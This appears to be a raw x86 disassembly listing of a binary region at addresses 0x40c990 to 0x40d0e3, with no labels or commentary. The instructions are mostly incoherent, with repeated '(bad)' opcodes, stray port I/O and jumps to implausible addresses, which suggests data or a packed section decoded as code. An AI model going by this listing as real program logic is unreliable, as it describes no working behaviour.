  40c990:	and    eax,0x1419976e
  40c995:	in     eax,dx
  40c996:	pop    es
  40c997:	xchg   ebp,eax
  40c998:	xlat   BYTE PTR ds:[ebx]
  40c999:	jle    0x40ca01
  40c99b:	data16 xchg BYTE PTR [eax],ch
  40c99e:	dec    edx
  40c99f:	clc    
  40c9a0:	lds    ebx,FWORD PTR [edi-0x3]
  40c9a3:	xor    ch,BYTE PTR [edi]
  40c9a5:	lahf   
  40c9a6:	xchg   edx,eax
  40c9a7:	and    al,0x4c
  40c9a9:	loope  0x40c934
  40c9ab:	es enter 0x4932,0x2c
  40c9b0:	mov    edx,eax
  40c9b2:	test   BYTE PTR [eax],ch
  40c9b4:	dec    edx
  40c9b5:	hlt    
  40c9b6:	sub    al,0x3c
  40c9b8:	inc    ebp
  40c9b9:	enter  0x279e,0xf0
  40c9bd:	adc    ah,BYTE PTR [ecx-0x78ab0eeb]
  40c9c3:	mov    bh,0x7a
  40c9c5:	mov    esp,0x3666ef50
  40c9ca:	pop    DWORD PTR [esi-0x1824f507]
  40c9d0:	xchg   esi,eax
  40c9d1:	mov    al,ds:0xf7ceac45
  40c9d6:	pop    esp
  40c9d7:	out    0xe1,al
  40c9d9:	adc    bh,bh
  40c9db:	call   0xe9434d9
  40c9e0:	pop    esi
  40c9e1:	or     bh,al
  40c9e3:	dec    eax
  40c9e4:	pop    eax
  40c9e5:	lods   al,BYTE PTR ds:[esi]
  40c9e6:	(bad)  
  40c9e7:	and    edx,ecx
  40c9e9:	xor    ecx,DWORD PTR [ebx]
  40c9eb:	and    esp,DWORD PTR [ecx+0x67]
  40c9ee:	add    al,BYTE PTR [esi-0x76366f1f]
  40c9f4:	mov    bh,BYTE PTR [ebp-0x4e]
  40c9f7:	cmp    al,0x93
  40c9f9:	xchg   ebp,eax
  40c9fa:	xor    ch,BYTE PTR [ebp+0x5632e893]
  40ca00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca01:	sub    eax,0xd6eddf17
  40ca06:	mov    ah,0x9b
  40ca08:	jb     0x40ca0d
  40ca0a:	or     ah,cl
  40ca0c:	xchg   ebx,eax
  40ca0d:	dec    esi
  40ca0e:	add    eax,0x47fb2316
  40ca13:	(bad)  
  40ca14:	pop    ss
  40ca15:	and    eax,esp
  40ca17:	mov    bh,0x53
  40ca19:	mov    ebx,0x9f6f841d
  40ca1e:	adc    edx,edx
  40ca20:	or     DWORD PTR [esi],esi
  40ca22:	dec    ecx
  40ca23:	mov    ds:0x7eb47003,al
  40ca28:	push   ss
  40ca29:	push   cs
  40ca2a:	mov    ecx,0x5e0db978
  40ca2f:	test   eax,0xc3339f0
  40ca34:	sar    BYTE PTR [ecx+0x76],0xb3
  40ca38:	sahf   
  40ca39:	popa   
  40ca3a:	or     dl,dl
  40ca3c:	icebp  
  40ca3d:	or     al,0xa4
  40ca3f:	mov    eax,ds:0x21144e83
  40ca44:	xchg   esi,eax
  40ca45:	call   0x450c8517
  40ca4a:	in     al,dx
  40ca4b:	lods   eax,DWORD PTR ds:[esi]
  40ca4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca4d:	and    al,BYTE PTR [edx]
  40ca4f:	iret   
  40ca50:	push   ebx
  40ca51:	adc    ecx,DWORD PTR [edi-0x70]
  40ca54:	xchg   BYTE PTR [eax-0x2c],cl
  40ca57:	add    BYTE PTR [edi-0x840e31c],cl
  40ca5d:	fxch   st(3)
  40ca5f:	mov    WORD PTR [ebp-0x360c903],cs
  40ca65:	xchg   ecx,eax
  40ca66:	out    dx,eax
  40ca67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca68:	push   esi
  40ca69:	stos   DWORD PTR es:[edi],eax
  40ca6a:	shr    DWORD PTR [esi-0x49],1
  40ca6d:	ins    DWORD PTR es:[edi],dx
  40ca6e:	xor    dl,dh
  40ca70:	mov    ds:0x4a13b8c1,al
  40ca75:	enter  0xedff,0x14
  40ca79:	or     al,0x14
  40ca7b:	xchg   BYTE PTR [ecx],ah
  40ca7d:	inc    ecx
  40ca7e:	adc    BYTE PTR [eax],dh
  40ca80:	xor    esi,DWORD PTR [ebx]
  40ca82:	ret    
  40ca83:	outs   dx,DWORD PTR ds:[esi]
  40ca84:	(bad)  
  40ca85:	out    dx,al
  40ca86:	jecxz  0x40cb04
  40ca88:	loope  0x40ca55
  40ca8a:	push   edi
  40ca8b:	sbb    dh,al
  40ca8d:	or     ecx,DWORD PTR [eax+0x29a80c60]
  40ca93:	sbb    WORD PTR [ebx+0x3d],cx
  40ca97:	sbb    eax,0x8589263a
  40ca9c:	jb     0x40ca33
  40ca9e:	jns    0x40ca86
  40caa0:	fisubr DWORD PTR [edx]
  40caa2:	cmp    eax,0xf630feba
  40caa7:	pop    ebp
  40caa8:	cmp    al,0x83
  40caaa:	jo     0x40ca30
  40caac:	imul   ebx,esp,0x23
  40caaf:	or     esi,ebp
  40cab1:	cmc    
  40cab2:	jbe    0x40ca4d
  40cab4:	test   eax,0x5d09aecb
  40cab9:	sbb    al,BYTE PTR [esi-0x58b41a0]
  40cabf:	in     eax,dx
  40cac0:	mov    bl,0xf8
  40cac2:	rol    DWORD PTR [ecx+0x1],0x90
  40cac6:	popa   
  40cac7:	add    bl,BYTE PTR [ecx]
  40cac9:	add    BYTE PTR [edx-0x30],dl
  40cacc:	xchg   esp,eax
  40cacd:	adc    DWORD PTR [eax+0x33],edx
  40cad0:	inc    esp
  40cad1:	sbb    eax,0x31c49007
  40cad6:	sub    DWORD PTR [edi],0xc801ebaf
  40cadc:	sbb    BYTE PTR [edx-0x310d124d],ah
  40cae2:	ja     0x40cae0
  40cae4:	(bad)  
  40cae5:	mov    bh,0x9b
  40cae7:	or     BYTE PTR [edx+edx*1],al
  40caea:	ss das 
  40caec:	mov    ebp,0x455bd3fa
  40caf1:	stos   BYTE PTR es:[edi],al
  40caf2:	neg    DWORD PTR [ebx-0x6afe041a]
  40caf8:	dec    edx
  40caf9:	add    eax,0xa53bf9d3
  40cafe:	add    eax,0x7565d9bb
  40cb03:	(bad)  
  40cb05:	adc    edi,DWORD PTR [esi-0x3e3c0e25]
  40cb0b:	add    BYTE PTR [ebx+ebx*4+0x91553c0],al
  40cb12:	or     eax,0x966721a3
  40cb17:	pop    ebx
  40cb18:	dec    eax
  40cb19:	mul    al
  40cb1b:	data16 int3 
  40cb1d:	xchg   ebp,eax
  40cb1e:	sub    BYTE PTR [edx],ah
  40cb20:	dec    esi
  40cb21:	jb     0x40cb36
  40cb23:	sbb    esi,DWORD PTR [ebx-0x77a60bc]
  40cb29:	sbb    DWORD PTR [edi-0x6faab9a0],edx
  40cb2f:	mov    cs,WORD PTR ds:0x62237520
  40cb35:	jle    0x40cb88
  40cb37:	(bad)  
  40cb38:	and    eax,0xe867a449
  40cb3d:	jmp    0xe875545d
  40cb42:	sub    BYTE PTR [ebx],ch
  40cb44:	sahf   
  40cb45:	add    al,0x61
  40cb47:	xor    cl,bh
  40cb49:	outs   dx,DWORD PTR ds:[esi]
  40cb4a:	cld    
  40cb4b:	mul    BYTE PTR ds:0xc7bf9ac6
  40cb51:	(bad)  
  40cb53:	mov    ebx,0x3870c1df
  40cb58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb59:	fucomi st,st(5)
  40cb5b:	jmp    0xfde9:0x140a
  40cb61:	cmp    ecx,DWORD PTR [ecx-0x8]
  40cb64:	popf   
  40cb65:	sbb    BYTE PTR [edx+0x60c1bf9],al
  40cb6b:	sub    al,0x2e
  40cb6d:	cs jb  0x40cb51
  40cb70:	ret    0xbf1a
  40cb73:	stc    
  40cb74:	cmp    ecx,edi
  40cb76:	mov    cl,0xd9
  40cb78:	push   ds
  40cb79:	add    ebp,DWORD PTR [edi+0xc]
  40cb7c:	inc    esp
  40cb7d:	pop    ebp
  40cb7e:	aad    0x4c
  40cb80:	nop
  40cb81:	mov    DWORD PTR [esi-0x3c6646c],esi
  40cb87:	retf   0xe810
  40cb8a:	add    DWORD PTR [esi-0xbb43fd1],ebx
  40cb90:	sub    esp,DWORD PTR [ebp+eiz*1-0x50]
  40cb94:	and    al,0x3f
  40cb96:	pop    ss
  40cb97:	pop    eax
  40cb98:	xor    DWORD PTR [ebx-0x4b451ec],edi
  40cb9e:	out    dx,al
  40cb9f:	sahf   
  40cba0:	enter  0x671d,0x2d
  40cba4:	jmp    FWORD PTR [esi]
  40cba6:	cld    
  40cba7:	aaa    
  40cba8:	div    DWORD PTR [eax+0x5d]
  40cbab:	xchg   DWORD PTR [esi],ecx
  40cbad:	arpl   WORD PTR [eax],si
  40cbaf:	mov    BYTE PTR [ecx-0x5a],al
  40cbb2:	xlat   BYTE PTR ds:[ebx]
  40cbb3:	mov    cl,0x53
  40cbb5:	mov    edi,0x750d7b85
  40cbba:	sahf   
  40cbbb:	sbb    al,BYTE PTR [edi]
  40cbbd:	(bad)  
  40cbbe:	or     BYTE PTR [eax+0x2258a2fe],ch
  40cbc4:	inc    esp
  40cbc5:	inc    edx
  40cbc6:	mov    ebp,0xc5c51312
  40cbcb:	leave  
  40cbcc:	pop    ebx
  40cbcd:	add    BYTE PTR [ebx-0x248a34df],bl
  40cbd3:	cmp    ch,ch
  40cbd5:	iret   
  40cbd6:	add    dl,BYTE PTR ds:[eax+0xc]
  40cbda:	shl    BYTE PTR [edi+0x12],0x7f
  40cbde:	and    BYTE PTR [edx+0xc],0x9e
  40cbe2:	xchg   BYTE PTR [edx-0x5867a2da],dh
  40cbe8:	retf   
  40cbe9:	sub    DWORD PTR [ecx-0x2f3cf1e9],0xffffffce
  40cbf0:	dec    edx
  40cbf1:	xor    ecx,DWORD PTR [esp]
  40cbf4:	scas   eax,DWORD PTR es:[edi]
  40cbf5:	add    ch,ah
  40cbf7:	sbb    WORD PTR [esi-0x72],bp
  40cbfb:	lock pop ebp
  40cbfd:	sub    esi,DWORD PTR [esi-0x76d9fe8f]
  40cc03:	repnz dec ebx
  40cc05:	(bad)  
  40cc06:	jno    0x40cc54
  40cc08:	test   eax,0x7b7b665c
  40cc0d:	fwait
  40cc0e:	or     edx,DWORD PTR [edi]
  40cc10:	xchg   DWORD PTR [edx-0x779dad75],edi
  40cc16:	mov    ds:0xf04c3084,al
  40cc1b:	add    eax,ebp
  40cc1d:	cld    
  40cc1e:	push   edx
  40cc1f:	sbb    bl,BYTE PTR [esi*8-0x30fdd40d]
  40cc26:	mov    BYTE PTR ds:0x51819964,0xd
  40cc2d:	sbb    al,0xe9
  40cc2f:	imul   ecx,DWORD PTR [edi-0x376e298b],0x38
  40cc36:	ret    0xd6ce
  40cc39:	add    edx,edx
  40cc3b:	or     bh,BYTE PTR ds:0x69bf0e66
  40cc41:	push   ds
  40cc42:	std    
  40cc43:	jo     0x40cbc6
  40cc45:	pop    edi
  40cc46:	clc    
  40cc47:	aad    0x65
  40cc49:	addr16 mov si,0xf7c0
  40cc4e:	jg     0x40cc32
  40cc50:	popf   
  40cc51:	or     al,0x6
  40cc53:	add    eax,DWORD PTR [esi]
  40cc55:	add    ecx,0x8
  40cc58:	adc    ecx,eax
  40cc5a:	xor    eax,DWORD PTR [edx+0x2bbf9f22]
  40cc60:	stc    
  40cc61:	repz jns 0x40cc64
  40cc64:	jp     0x40cc23
  40cc66:	push   ds
  40cc67:	adc    edx,DWORD PTR [ebx]
  40cc69:	adc    edx,esp
  40cc6b:	jmp    0x40ccba
  40cc6d:	inc    bl
  40cc6f:	das    
  40cc70:	cld    
  40cc71:	and    DWORD PTR [edi-0x71],eax
  40cc74:	cmovs  esp,esp
  40cc77:	or     al,0x88
  40cc79:	mov    BYTE PTR es:[edx-0x6f6db946],dl
  40cc80:	inc    esp
  40cc81:	xor    DWORD PTR [ecx-0x14],edx
  40cc84:	sub    edx,DWORD PTR ds:0x23888a20
  40cc8a:	mov    eax,ds:0x41492172
  40cc8f:	bound  esi,QWORD PTR [ebp+0x60]
  40cc92:	inc    ebx
  40cc93:	lods   al,BYTE PTR ds:[esi]
  40cc94:	pop    edx
  40cc95:	dec    edx
  40cc96:	jp     0x40cc28
  40cc98:	push   ebp
  40cc99:	or     esi,DWORD PTR [eax-0x78]
  40cc9c:	lds    edx,FWORD PTR ds:0xcbc482cd
  40cca2:	push   ds
  40cca3:	rol    DWORD PTR [bp+si+0x66],1
  40cca7:	sbb    ebp,ecx
  40cca9:	xor    eax,0xf74fdc2c
  40ccae:	jns    0x40cc79
  40ccb0:	test   al,0xb8
  40ccb2:	pop    ss
  40ccb3:	outs   dx,BYTE PTR ds:[esi]
  40ccb4:	inc    esi
  40ccb5:	loop   0x40cc83
  40ccb7:	fstp   QWORD PTR ds:[edi]
  40ccba:	ror    BYTE PTR ds:0x23884e03,cl
  40ccc0:	lock cmp eax,0x112f1898
  40ccc6:	(bad)  
  40ccc7:	jb     0x40cc4d
  40ccc9:	add    DWORD PTR [eax-0x3b56ad0b],ebx
  40cccf:	(bad)  
  40ccd0:	(bad)  
  40ccd1:	xchg   esi,eax
  40ccd2:	int    0xe6
  40ccd4:	in     al,dx
  40ccd5:	cmp    al,0x5b
  40ccd7:	enter  0x746d,0x1
  40ccdb:	ret    0x864d
  40ccde:	add    bh,BYTE PTR [ebx-0x62]
  40cce1:	aas    
  40cce2:	inc    edx
  40cce3:	dec    esp
  40cce4:	jp     0x40cc75
  40cce6:	out    0xba,al
  40cce8:	scas   al,BYTE PTR es:[edi]
  40cce9:	jp     0x40cc8b
  40cceb:	xchg   BYTE PTR ds:[ebx-0x22472f04],bl
  40ccf2:	pop    esp
  40ccf3:	cmp    eax,edx
  40ccf5:	cmc    
  40ccf6:	lods   al,BYTE PTR ds:[esi]
  40ccf7:	cmc    
  40ccf8:	xlat   BYTE PTR ds:[ebx]
  40ccf9:	pop    ebx
  40ccfa:	jbe    0x40cc9b
  40ccfc:	(bad)
  40ccff:	lods   eax,DWORD PTR ds:[esi]
  40cd00:	cmc    
  40cd01:	dec    eax
  40cd02:	aas    
  40cd03:	xchg   ebx,eax
  40cd04:	les    ecx,FWORD PTR [ecx-0x14]
  40cd07:	mov    eax,ds:0x575700a3
  40cd0c:	aaa    
  40cd0d:	imul   esi,DWORD PTR [ebp-0x7b10cb43],0x5e1ec1d4
  40cd17:	dec    esp
  40cd18:	sub    esi,esi
  40cd1a:	hlt    
  40cd1b:	add    BYTE PTR ds:0xcdfd23f7,dh
  40cd21:	shr    DWORD PTR [ebx+ecx*2+0x53],0x96
  40cd26:	call   0x456630fd
  40cd2b:	mov    al,0xdf
  40cd2d:	adc    BYTE PTR [esi-0x4a322af5],bh
  40cd33:	push   ebp
  40cd34:	xor    DWORD PTR [ecx],edx
  40cd36:	cmp    edi,DWORD PTR [edi+0x46]
  40cd39:	es fs mov dl,0xf9
  40cd3d:	(bad)  
  40cd3f:	rcr    DWORD PTR [ecx],cl
  40cd41:	in     al,dx
  40cd42:	in     eax,0x5f
  40cd44:	(bad)  
  40cd45:	fcom   QWORD PTR [ecx+0x66]
  40cd48:	data16 (bad) 
  40cd4a:	js     0x40cd2b
  40cd4c:	mov    bh,0xbd
  40cd4e:	sahf   
  40cd4f:	jae    0x40cd38
  40cd51:	into   
  40cd52:	xor    DWORD PTR [eax],ebx
  40cd54:	or     al,0x32
  40cd56:	dec    ecx
  40cd57:	pop    edx
  40cd58:	ja     0x40cd8c
  40cd5a:	cli    
  40cd5b:	in     eax,0x89
  40cd5d:	mov    esi,0xc37cd968
  40cd62:	jge    0x40cd5f
  40cd64:	div    cl
  40cd66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd67:	(bad)  
  40cd68:	mov    ebp,0xdbfe67c8
  40cd6d:	imul   eax,DWORD PTR [esi],0xfd251ed1
  40cd73:	test   eax,0x44914ca4
  40cd78:	mov    eax,ds:0x8e263880
  40cd7d:	cmp    eax,0xbcf127fd
  40cd82:	add    al,0x89
  40cd84:	xchg   DWORD PTR [edi-0x70e639dc],edx
  40cd8a:	popa   
  40cd8b:	add    al,BYTE PTR [edx]
  40cd8d:	mov    eax,ds:0x9a597672
  40cd92:	push   esp
  40cd93:	adc    DWORD PTR [edi-0x57],edi
  40cd96:	sbb    ecx,esi
  40cd98:	sbb    eax,0x6801d263
  40cd9d:	imul   ebx,DWORD PTR [edi-0x5aad541b],0x1ce39ddb
  40cda7:	inc    esi
  40cda8:	and    BYTE PTR [ebx],dh
  40cdaa:	test   BYTE PTR ds:0xe9636e3d,0xd0
  40cdb1:	mov    ebp,0x55a876ab
  40cdb6:	push   ebp
  40cdb7:	adc    eax,0x8901274a
  40cdbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdbd:	bound  eax,QWORD PTR [eax]
  40cdbf:	les    edx,FWORD PTR [esp+edi*2+0x18d02b35]
  40cdc6:	sti    
  40cdc7:	fdivr  st(1),st
  40cdc9:	addr16 mov ds:0x8b4c,eax
  40cdcd:	cmp    eax,0x536e0362
  40cdd2:	and    dl,BYTE PTR [eax]
  40cdd4:	shl    DWORD PTR [esi-0x73],cl
  40cdd7:	add    BYTE PTR [esp+eiz*8-0x4d53f32],cl
  40cdde:	fwait
  40cddf:	mov    bh,0x1
  40cde1:	js     0x40cdfc
  40cde3:	aad    0x60
  40cde5:	daa    
  40cde6:	clc    
  40cde7:	or     DWORD PTR [eax],edi
  40cde9:	sub    al,ch
  40cdeb:	mov    ch,0xb3
  40cded:	xchg   esp,eax
  40cdee:	in     eax,dx
  40cdef:	les    eax,FWORD PTR [esi+ebp*2]
  40cdf2:	fs lahf 
  40cdf4:	jns    0x40ce24
  40cdf6:	jae    0x40cdb7
  40cdf8:	mov    eax,ds:0x96a4d3d6
  40cdfd:	(bad)  
  40cdfe:	adc    dh,ch
  40ce00:	sub    DWORD PTR [edx],0x2f673295
  40ce06:	pop    esp
  40ce07:	mov    bx,0xd815
  40ce0b:	xlat   BYTE PTR ds:[ebx]
  40ce0c:	push   ebx
  40ce0d:	(bad)
  40ce11:	xor    dl,dl
  40ce13:	iret   
  40ce14:	sbb    eax,0xb81e938
  40ce19:	or     BYTE PTR [edi+eiz*8],bl
  40ce1c:	pop    ebp
  40ce1d:	xor    eax,DWORD PTR [esi+ecx*2]
  40ce20:	jbe    0x40cddd
  40ce22:	cmp    DWORD PTR [esi],edi
  40ce24:	mov    ch,0x21
  40ce26:	in     al,dx
  40ce27:	mov    al,0x5d
  40ce29:	dec    edx
  40ce2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce2b:	sbb    eax,edi
  40ce2d:	rol    BYTE PTR [eax-0x23],cl
  40ce30:	add    al,0x64
  40ce32:	adc    DWORD PTR [edx],edx
  40ce34:	sub    BYTE PTR [ecx+0x47e05ad1],dh
  40ce3a:	jg     0x40ce38
  40ce3c:	dec    edi
  40ce3d:	cdq    
  40ce3e:	sahf   
  40ce3f:	outs   dx,BYTE PTR ds:[esi]
  40ce40:	repnz cli 
  40ce42:	pop    es
  40ce43:	out    dx,al
  40ce44:	in     al,0xd4
  40ce46:	test   eax,0x38990053
  40ce4b:	hlt    
  40ce4c:	and    dl,BYTE PTR ds:0x40cc7ae0
  40ce52:	dec    edx
  40ce53:	xor    eax,0x81c0e08f
  40ce58:	add    esi,esp
  40ce5a:	jp     0x40ce6d
  40ce5c:	mov    edi,0x738f1bf2
  40ce61:	jmp    0x8e29e7b0
  40ce66:	adc    edi,0x0
  40ce69:	add    dh,ch
  40ce6b:	cmp    al,0x52
  40ce6d:	fdiv   DWORD PTR [edx+ebx*2]
  40ce70:	stos   BYTE PTR es:[edi],al
  40ce71:	js     0x40ce19
  40ce73:	repnz push ss
  40ce75:	les    ecx,FWORD PTR [ecx+0x2291a78f]
  40ce7b:	sahf   
  40ce7c:	cmp    BYTE PTR [eax],0x25
  40ce7f:	cmp    ch,bl
  40ce81:	adc    eax,0xfba7efb4
  40ce86:	push   edi
  40ce87:	dec    eax
  40ce88:	dec    ebp
  40ce89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce8a:	out    0x1d,al
  40ce8c:	sar    DWORD PTR [eax-0x7a],cl
  40ce8f:	xor    al,0x69
  40ce91:	xchg   DWORD PTR [ebx-0x6a4e8bdc],eax
  40ce97:	sub    al,0x5a
  40ce99:	xor    BYTE PTR [edi-0x12d14cd],dl
  40ce9f:	or     dl,BYTE PTR [ebx+0x1061c82a]
  40cea5:	inc    edx
  40cea6:	or     BYTE PTR [edx],dh
  40cea8:	jne    0x40ceb3
  40ceaa:	repnz push 0xffffff80
  40cead:	push   esp
  40ceae:	cmc    
  40ceaf:	add    BYTE PTR [ebx+0x1467bd44],dl
  40ceb5:	sub    DWORD PTR [edi],0x22
  40ceb8:	xchg   edx,eax
  40ceb9:	and    al,0x24
  40cebb:	mov    ?,WORD PTR [edx+0x78ee6581]
  40cec1:	hlt    
  40cec2:	cmp    al,0xcf
  40cec4:	(bad)  
  40cec5:	pop    esp
  40cec6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cec7:	iret   
  40cec8:	and    eax,0x2d02ae00
  40cecd:	outs   dx,BYTE PTR ds:[esi]
  40cece:	arpl   WORD PTR [ebx-0x5f5ffb97],di
  40ced4:	mov    ebp,0xdf78219f
  40ced9:	aaa    
  40ceda:	nop
  40cedb:	lea    ecx,ds:[ebx]
  40cede:	xor    BYTE PTR [eax+ebx*2+0x2d1d049],bl
  40cee5:	adc    al,BYTE PTR [esi]
  40cee7:	(bad)  
  40cee8:	fwait
  40cee9:	rcr    DWORD PTR [eax-0x6faf6fd1],0x2d
  40cef0:	gs push edi
  40cef2:	dec    esp
  40cef3:	sar    BYTE PTR ds:0x1c2dbf2f,0xc
  40cefa:	mov    dl,0xbe
  40cefc:	outs   dx,BYTE PTR ds:[esi]
  40cefd:	popa   
  40cefe:	push   0x1
  40cf00:	xchg   esp,eax
  40cf01:	cmp    BYTE PTR [ebx-0x1a],dh
  40cf04:	sub    ah,BYTE PTR [ecx+0x37]
  40cf07:	mov    al,0x1e
  40cf09:	add    BYTE PTR [eax+0x5b],al
  40cf0c:	jl     0x40cf21
  40cf0e:	cmp    al,0x2f
  40cf10:	inc    esi
  40cf11:	es xchg edx,eax
  40cf13:	xchg   edx,eax
  40cf14:	xchg   esp,eax
  40cf15:	js     0x40cf58
  40cf17:	or     cl,bl
  40cf19:	mov    bl,0x44
  40cf1b:	dec    edi
  40cf1c:	data16 add BYTE PTR [eax*1+0x7a2277db],ah
  40cf24:	jae    0x40ced5
  40cf26:	mov    ds:0xee752965,al
  40cf2b:	add    BYTE PTR [edi-0x5fd64218],dh
  40cf31:	and    DWORD PTR [ebp-0x77],ebx
  40cf34:	add    eax,0xd5d2e650
  40cf39:	pop    ecx
  40cf3a:	dec    BYTE PTR [edi+0x7e39f67f]
  40cf40:	out    0xa7,al
  40cf42:	ds enter 0xe2e2,0x22
  40cf47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf48:	dec    edi
  40cf49:	lahf   
  40cf4a:	mov    dh,0x36
  40cf4c:	pushf  
  40cf4d:	and    ah,BYTE PTR [ebx]
  40cf4f:	lahf   
  40cf50:	xchg   ecx,eax
  40cf51:	pop    edx
  40cf52:	xlat   BYTE PTR ds:[ebx]
  40cf53:	bound  ecx,QWORD PTR [edi*8-0x42856082]
  40cf5a:	into   
  40cf5b:	cld    
  40cf5c:	cld    
  40cf5d:	cmp    al,0xbf
  40cf5f:	clc    
  40cf60:	lahf   
  40cf61:	mov    esi,0x6f4f13c8
  40cf66:	xchg   ebx,eax
  40cf67:	mov    BYTE PTR ds:0x54cdfd0d,al
  40cf6d:	jno    0x40cef8
  40cf6f:	dec    esp
  40cf70:	bound  esp,QWORD PTR [esp+ecx*1-0x77]
  40cf74:	hlt    
  40cf75:	dec    eax
  40cf76:	loop   0x40cfc0
  40cf78:	gs int3 
  40cf7a:	mov    DWORD PTR [edx-0x1e],esp
  40cf7d:	sub    dl,al
  40cf7f:	test   DWORD PTR [edx],0x802654a4
  40cf85:	in     al,dx
  40cf86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf87:	fwait
  40cf88:	sub    al,0x40
  40cf8b:	and    ebx,DWORD PTR [eax+0x4]
  40cf8e:	mov    al,ds:0xbf694c27
  40cf93:	push   0x50605aa1
  40cf98:	mov    esi,0xb5e909e2
  40cf9d:	mov    ch,0x88
  40cf9f:	and    dl,bh
  40cfa1:	dec    ecx
  40cfa2:	call   0x947d:0x22e8385f
  40cfa9:	retf   0x545a
  40cfac:	mov    esp,0x200000
  40cfb1:	dec    ecx
  40cfb2:	inc    esp
  40cfb3:	inc    ecx
  40cfb4:	push   esp
  40cfb5:	sbb    al,0x53
  40cfb7:	lds    edi,FWORD PTR [ecx]
  40cfb9:	aaa    
  40cfba:	int    0x39
  40cfbc:	sbb    ch,al
  40cfbe:	inc    edx
  40cfbf:	and    eax,0x8d258904
  40cfc4:	pop    edx
  40cfc5:	lahf   
  40cfc6:	mov    DWORD PTR [ecx+0xd817132],esi
  40cfcc:	shl    BYTE PTR [ebp-0x5c],0x3b
  40cfd0:	mov    eax,0x7d024f00
  40cfd5:	outs   dx,BYTE PTR ds:[esi]
  40cfd6:	arpl   bx,bx
  40cfd8:	push   ebp
  40cfd9:	ins    DWORD PTR es:[edi],dx
  40cfda:	inc    eax
  40cfdb:	and    eax,edx
  40cfdd:	mov    edx,0x1801b1bd
  40cfe2:	imul   esp,DWORD PTR [esi+0x210f74e9],0x1c
  40cfe9:	into   
  40cfea:	in     al,dx
  40cfeb:	cld    
  40cfec:	dec    ecx
  40cfed:	cdq    
  40cfee:	pop    edx
  40cfef:	inc    esi
  40cff0:	ja     0x40d024
  40cff2:	mov    es,WORD PTR [eax+0x36]
  40cff5:	push   edx
  40cff6:	or     eax,0xf20bd8c8
  40cffb:	xlat   BYTE PTR ds:[ebx]
  40cffc:	xor    eax,edi
  40cffe:	in     eax,dx
  40cfff:	push   esi
  40d000:	test   DWORD PTR [edi],0x83063835
  40d006:	add    DWORD PTR [eax-0x6b],ecx
  40d009:	adc    al,0xd2
  40d00b:	pusha  
  40d00c:	sbb    cl,BYTE PTR [edi+0x8]
  40d00f:	jl     0x40d070
  40d011:	jo     0x40d009
  40d013:	fsub   QWORD PTR [esi]
  40d015:	sub    dl,BYTE PTR [ecx]
  40d017:	push   0x24b1c5b6
  40d01c:	or     al,0x63
  40d01e:	sub    BYTE PTR [ecx],al
  40d020:	adc    DWORD PTR [esp-0x15eb85aa],edx
  40d027:	imul   dl
  40d029:	pop    edi
  40d02a:	xchg   al,ch
  40d02c:	in     eax,dx
  40d02d:	mov    cl,0xe4
  40d02f:	mov    bh,0x39
  40d031:	sti    
  40d032:	jbe    0x40d076
  40d034:	pop    es
  40d035:	push   es
  40d036:	dec    ebp
  40d037:	cmp    dh,bh
  40d039:	outs   dx,BYTE PTR ds:[esi]
  40d03a:	xor    eax,0x4c3a5a6
  40d03f:	rcl    ah,cl
  40d041:	ins    BYTE PTR es:[edi],dx
  40d042:	mov    BYTE PTR [edx],bl
  40d044:	daa    
  40d045:	xchg   esi,eax
  40d046:	daa    
  40d047:	stc    
  40d048:	pop    es
  40d049:	lahf   
  40d04a:	cld    
  40d04b:	add    edi,esi
  40d04d:	in     eax,dx
  40d04e:	(bad)  
  40d04f:	stc    
  40d050:	popa   
  40d051:	push   ss
  40d052:	pop    ss
  40d053:	pop    ss
  40d054:	cmp    DWORD PTR [ebx-0x1a],esi
  40d057:	or     al,0xa5
  40d059:	push   edx
  40d05a:	leave  
  40d05b:	adc    bh,BYTE PTR [ebx-0x37745147]
  40d061:	repnz fisttp DWORD PTR [ebp+0x3f]
  40d065:	fwait
  40d066:	cmp    al,BYTE PTR [ebp-0x1ee371b9]
  40d06c:	clc    
  40d06d:	dec    ebx
  40d06e:	out    0xf9,eax
  40d070:	lods   eax,DWORD PTR ds:[esi]
  40d071:	fistp  QWORD PTR ds:0xae3fbb46
  40d077:	xor    esp,DWORD PTR [esi]
  40d079:	push   ebp
  40d07a:	pushf  
  40d07b:	(bad)  
  40d07d:	dec    ebx
  40d07e:	mov    DWORD PTR [edx+0x47b1c45f],esi
  40d084:	adc    al,0xc5
  40d086:	inc    esp
  40d087:	mov    DWORD PTR [eax],esp
  40d089:	mov    ah,BYTE PTR [edx+0x3c]
  40d08c:	(bad)  
  40d08e:	dec    edi
  40d08f:	and    BYTE PTR ds:0xfd7c88df,bh
  40d095:	ins    DWORD PTR es:[edi],dx
  40d096:	int    0xf9
  40d098:	jns    0x40d083
  40d09a:	call   0xe075d541
  40d09f:	mov    dl,0x99
  40d0a1:	jle    0x40d100
  40d0a3:	push   es
  40d0a4:	nop
  40d0a5:	inc    edx
  40d0a6:	jnp    0x40d0a5
  40d0a8:	and    BYTE PTR ss:[edx+edi*8+0x11bb7681],bl
  40d0b0:	ss stc 
  40d0b2:	jnp    0x40d05a
  40d0b4:	or     al,0x43
  40d0b6:	mov    ecx,0x8e5af515
  40d0bb:	outs   dx,DWORD PTR ds:[esi]
  40d0bc:	pop    eax
  40d0bd:	sbb    eax,DWORD PTR [eax+0x22]
  40d0c0:	or     ebx,esp
  40d0c2:	test   BYTE PTR [eax],bh
  40d0c4:	xchg   BYTE PTR [eax],ah
  40d0c6:	sbb    dl,dl
  40d0c8:	push   0x76644834
  40d0cd:	and    dl,BYTE PTR [eax-0x30c2d7d5]
  40d0d3:	mov    ds:0x1917efdf,eax
  40d0d8:	add    bh,cl
  40d0da:	jl     0x40d0cb
  40d0dc:	idiv   DWORD PTR [esi-0x11]
  40d0df:	into   
  40d0e0:	les    esi,FWORD PTR [ecx+0xb]
  40d0e3:	fisubr DWORD PTR [esi-0x4e]
